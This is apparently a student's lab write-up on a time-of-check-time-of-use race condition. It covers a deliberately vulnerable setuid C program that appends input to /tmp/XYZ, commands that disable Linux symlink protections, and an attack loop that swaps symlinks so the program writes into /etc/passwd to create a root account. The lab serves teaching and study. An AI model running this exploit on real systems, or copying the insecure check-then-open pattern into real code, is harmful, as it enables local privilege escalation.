# Race Condition Lab

## What is race condition

A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race-condition vulnerability, attackers can run a parallel process to “race” against the privileged program, with an intention to change the behaviors of the program.

## Environment Setup

```bash
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl fs.protected_regular=0
```

`fs.protected_symlinks`: A long-standing class of security issues is the symlink-based time-of-check-time-of-use race, most commonly seen in world-writable directories like /tmp. The common method of exploitation of this flaw is to cross privilege boundaries when following a given symlink (i.e. a root process follows a symlink belonging to another user). For a likely incomplete list of hundreds of examples across the years, please see: http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=/tmp

## Vulnerable Code

```c
int main()
{
    printf("RUID %d\n", getuid());
    printf("EUID %d\n", geteuid());

    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    /* check if the file is writable */
    if (!access(fn, W_OK)) { // <----- check the RUID
        fp = fopen(fn, "a+"); // <----- check the EUID
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}
```

Vulnerability: **the time window between the check for write permission and the opening of the file**. 

- There is a possibility that the file used by `access()` is different from the file used by `fopen()`, even though they have the same file name `/tmp/XYZ`. If a malicious attacker can somehow makes `/tmp/XYZ` a **symbolic link** pointing to a protected file, such as `/etc/passwd`, inside the time window, the attacker can cause the user input to be appended to `/etc/passwd`, and can thus gain the root privilege. The vulnerable program runs with the root privilege, so it can overwrite any file.
- `access()` vs `fopen()`: `access()` checks the file permission of the file name with read uid, but `fopen()` opens the file with the effective user id (EUID) of the process.
- In order to exploit this vulnerability to open file owned by root, the program has to be a **SET-UID** program and the program file owner has to be **root**. Because the **SET-UID** program allow the user a program with the EUID equals to the program file owner. We can achieve this by using the following commands.

```bash
$ sudo chown root vulp
$ sudo chmod 4755 vulp
```

## Task 1: Choose a target file to overwrite

- Target file: `/etc/passwd` because it is not writable by the normal user and if it is overwritten, the attacker can gain root privilege.
- Goal: create a new user account with root privilege, i.e, user id has to be 0.

## Task 2: Launching the Race Condition Attack

### Attack Program

The atomic swap is needed to avoid the context switch between the `unlink()` and `symlink()` calls.

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char argv[]) {
  while (1) {
	unsigned int FLAG = RENAME_EXCHANGE;
	unlink("/tmp/XYZ"); symlink("/tmp/123","/tmp/XYZ");
	unlink("/tmp/ABC"); symlink("/etc/passwd","/tmp/ABC");
	renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", FLAG); // This swap the two files ATOMICALLY, i.e, /tmp/XYZ links to /etc/passwd and /tmp/ABC links to /tmp/XYZ
	sleep(0.1);
  }
}
```

### DEMO

https://github.com/user-attachments/assets/35213002-80b5-414b-8c76-679878e0be00



